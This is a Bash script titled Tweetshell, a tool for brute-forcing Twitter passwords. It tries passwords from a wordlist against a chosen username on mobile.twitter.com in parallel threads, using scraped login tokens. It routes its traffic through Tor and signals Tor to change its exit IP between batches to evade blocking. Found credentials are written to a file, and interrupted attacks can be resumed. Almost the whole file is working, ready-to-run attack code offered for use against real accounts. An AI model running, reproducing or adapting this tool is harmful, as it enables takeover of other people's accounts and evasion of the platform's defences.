#!/bin/bash
# Tweetshell v1.0
# Coded by: github.com/thelinuxchoice
# Instagram: @thelinuxchoice

trap 'store;exit 1' 2

checkroot() {
#if [[ "$(id -u)" -ne 0 ]]; then
    printf "\e[1;77mWelcome to my costumzie!\n\e[0m"
#    exit 1
#fi
}

dependencies() {

command -v tor > /dev/null 2>&1 || { echo >&2 "I require tor but it's not installed. Run ./install.sh. Aborting."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Run ./install.sh. Aborting."; exit 1; }

}

banner() {


printf "\e[1;36m      _  _     _____                 _  \e[1;92m     _          _ _  \e[0m\n"
printf "\e[1;36m    _| || |_  |_   _|               | | \e[1;92m    | |        | | | \e[0m\n"
printf "\e[1;36m   |_  __  _|   | |_      _____  ___| |_\e[1;92m ___| |__   ___| | | \e[0m\n"
printf "\e[1;36m    _| || |_    | \ \ /\ / / _ \/ _ \ __\e[1;92m/ __| '_ \ / _ \ | | \e[0m\n"
printf "\e[1;36m   |_  __  _|   | |\ V  V /  __/  __/ |_\e[1;92m\__ \ | | |  __/ | | \e[0m\n"
printf "\e[1;36m     |_||_|     \_/ \_/\_/ \___|\___|\__\e[1;92m|___/_| |_|\___|_|_| \e[0m\n"
printf "\n"
printf "\e[1;77m\e[44m Twitter BruteForcer v1.0 Author: thelinuxchoice (Github/IG)\e[0m\n"
printf "\n"
}

function start() {
banner
checkroot
dependencies
read -p $'\e[1;92mUsername account: \e[0m' username

checkaccount=$(curl -L -s https://www.twitter.com/$username/ | grep -c "Sorry, that page doesn’t exist!")
if [[ "$checkaccount" == 1 ]]; then
printf "\e[1;91mInvalid Username! Try again\e[0m\n"
sleep 1
start
else
default_wl_pass="passwords.lst"
read -p $'\e[1;92mPassword List (Enter to default list): \e[0m' wl_pass
wl_pass="${wl_pass:-${default_wl_pass}}"
default_threads="10"
read -p $'\e[1;92mThreads (Use < 20, Default 10): \e[0m' threads
threads="${threads:-${default_threads}}"
fi
}

checktor() {

check=$(curl  -s https://check.torproject.org > /dev/null; echo $?)

if [[ "$check" -gt 0 ]]; then
printf "\e[1;91mPlease, check your TOR Connection! Just type tor or service tor start\n\e[0m"
exit 1
fi

}

function store() {

if [[ -n "$threads" ]]; then
printf "\e[1;91m [*] Waiting threads shutting down...\n\e[0m"
if [[ "$threads" -gt 10 ]]; then
sleep 6
else
sleep 3
fi
rm -rf cookies*
default_session="Y"
printf "\n\e[1;77mSave session for user\e[0m\e[1;92m %s \e[0m" $username
read -p $'\e[1;77m? [Y/n]: \e[0m' session
session="${session:-${default_session}}"
if [[ "$session" == "Y" || "$session" == "y" || "$session" == "yes" || "$session" == "Yes" ]]; then
if [[ ! -d sessions ]]; then
mkdir sessions
fi
printf "username=\"%s\"\npassword=\"%s\"\nwl_pass=\"%s\"\ntoken=\"%s\"\n" $username $password $wl_pass $token > sessions/store.session.$username.$(date +"%FT%H%M")
printf "\e[1;77mSession saved.\e[0m\n"
printf "\e[1;92mUse ./instashell --resume\n"
else
exit 1
fi
else
exit 1
fi
}


function changeip() {

killall -HUP tor


}

function bruteforcer() {


uagent="Mozilla/5.0 (Series40; NokiaX2-02/10.90; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/1.0.2.26.11"
checktor
count_pass=$(wc -l $wl_pass | cut -d " " -f1)
printf "\e[1;92mUsername:\e[0m\e[1;77m %s\e[0m\n" $username
printf "\e[1;92mWordlist:\e[0m\e[1;77m %s (%s)\e[0m\n" $wl_pass $count_pass
printf "\e[1;91m[*] Press Ctrl + C to stop or save session\n\e[0m"
token=0
startline=1
endline="$threads"
changeip
while [ $token -lt $count_pass ]; do
IFS=$'\n'
for password in $(sed -n ''$startline','$endline'p' $wl_pass); do
countpass=$(grep -n "$password" "$wl_pass" | cut -d ":" -f1)

COOKIES='cookies'$countpass''


let token++
printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $token $count_pass $password

{(trap '' SIGINT && initpage=$(curl --socks5-hostname localhost:9050 -s -b $COOKIES -c $COOKIES -L -A "$uagent" "https://mobile.twitter.com/session/new"); tokent=$(echo "$initpage" | grep "authenticity_token" | sed -e 's/.*value="//' | cut -d '"' -f 1 | head -n 1) ; var=$(curl --socks5-hostname localhost:9050  -s -b $COOKIES -c $COOKIES -L -A "$uagent" -d "authenticity_token=$tokent&session[username_or_email]=$username&session[password]=$password&remember_me=1&wfa=1&commit=Log+in" "https://mobile.twitter.com/sessions"); if [[ "$var" == *"/account/login_verification"* ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [!] Login verification required.\n" $password; printf "Username: %s, Password: %s\n" $username $password >> found.tweetshell ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.tweetshell \n\e[0m"; rm -rf cookies*; kill -1 $$; elif [[ "$var" == *"/account/login_challenge"* ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [!] Login challenge required.\n" $password; printf "Username: %s, Password: %s\n" $username $password >> found.tweetshell ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.tweetshell \n\e[0m"; rm -rf cookies*; kill -1 $$; elif [[ "$var" == *"/compose/tweet"* ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $password; printf "Username: %s, Password: %s\n" $username $password >> found.tweetshell ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.tweetshell \n\e[0m"; rm -rf cookies*; kill -1 $$; fi; ) } & done; wait $!;

let startline+=$threads
let endline+=$threads
changeip
rm -rf cookies1
rm -rf cookies$countpass
done
exit 1
}

function resume() {

banner 
checktor
counter=1
if [[ ! -d sessions ]]; then
printf "\e[1;91m[*] No sessions\n\e[0m"
exit 1
fi
printf "\e[1;92mFiles sessions:\n\e[0m"
for list in $(ls sessions/store.session*); do
IFS=$'\n'
source $list
printf "\e[1;92m%s \e[0m\e[1;77m: %s (\e[0m\e[1;92mwl:\e[0m\e[1;77m %s\e[0m\e[1;92m,\e[0m\e[1;92m lastpass:\e[0m\e[1;77m %s )\n\e[0m" "$counter" "$list" "$wl_pass" "$password"
let counter++
done
read -p $'\e[1;92mChoose a session number: \e[0m' fileresume
source $(ls sessions/store.session* | sed ''$fileresume'q;d')
default_threads=10
read -p $'\e[1;92mThreads (Use < 20, Default 10): \e[0m' threads
threads="${threads:-${default_threads}}"

printf "\e[1;92m[*] Resuming session for user:\e[0m \e[1;77m%s\e[0m\n" $username
printf "\e[1;92m[*] Wordlist: \e[0m \e[1;77m%s\e[0m\n" $wl_pass
printf "\e[1;91m[*] Press Ctrl + C to stop or save session\n\e[0m"


count_pass=$(wc -l $wl_pass | cut -d " " -f1)
changeip
while [ $token -lt $count_pass ]; do
IFS=$'\n'
for password in $(sed -n '/\b'$password'\b/,'$(($token+threads))'p' $wl_pass); do
COOKIES='cookies'$countpass''
countpass=$(grep -n -w "$password" "$wl_pass" | cut -d ":" -f1)
printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $token $count_pass $password
let token++
{(trap '' SIGINT && initpage=$(curl --socks5-hostname localhost:9050 -s -b $COOKIES -c $COOKIES -L -A "$uagent" "https://mobile.twitter.com/session/new"); tokent=$(echo "$initpage" | grep "authenticity_token" | sed -e 's/.*value="//' | cut -d '"' -f 1 | head -n 1) ; var=$(curl --socks5-hostname localhost:9050  -s -b $COOKIES -c $COOKIES -L -A "$uagent" -d "authenticity_token=$tokent&session[username_or_email]=$username&session[password]=$password&remember_me=1&wfa=1&commit=Log+in" "https://mobile.twitter.com/sessions"); if [[ "$var" == *"/account/login_verification"* ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [!] Login verification required.\n" $password; printf "Username: %s, Password: %s\n" $username $password >> found.tweetshell ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.tweetshell \n\e[0m"; rm -rf cookies*; kill -1 $$; elif [[ "$var" == *"/account/login_challenge"* ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [!] Login challenge required.\n" $password; printf "Username: %s, Password: %s\n" $username $password >> found.tweetshell ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.tweetshell \n\e[0m"; rm -rf cookies*; kill -1 $$; elif [[ "$var" == *"/compose/tweet"* ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $password; printf "Username: %s, Password: %s\n" $username $password >> found.tweetshell ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.tweetshell \n\e[0m"; rm -rf cookies*; kill -1 $$; fi; ) } & done; wait $!;
changeip
rm -rf cookies1
rm -rf cookies$countpass
done
exit 1
}

case "$1" in --resume) resume ;; *)
start
bruteforcer
esac

